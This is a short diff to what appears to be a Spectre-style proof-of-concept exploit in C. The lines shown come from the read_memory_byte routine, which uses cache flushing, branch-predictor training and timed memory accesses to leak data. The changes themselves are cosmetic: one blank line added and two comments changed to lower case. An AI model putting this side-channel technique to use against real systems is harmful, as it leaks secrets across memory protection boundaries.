@@ -68,6 +68,7 @@ void read_memory_byte(size_t malicious_x, uint8_t value[2], int score[2]) {
 #else
 #error No cache flush implementation exists for your architecture!
 #endif
+
 			for (z = 0; z < 100; z++); /* Delay (can also mfence) */
 
 			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
@@ -87,9 +88,9 @@ void read_memory_byte(size_t malicious_x, uint8_t value[2], int score[2]) {
 
 			time1 = __gettime();
 
-			junk = *addr; /* MEMORY ACCESS TO TIME */
+			junk = *addr; /* memory access to time */
 
-			/* READ TIMER & COMPUTE ELAPSED TIME */
+			/* read timer & compute elapsed time */
 			time2 = __gettime();
 			time2 -= time1;
 
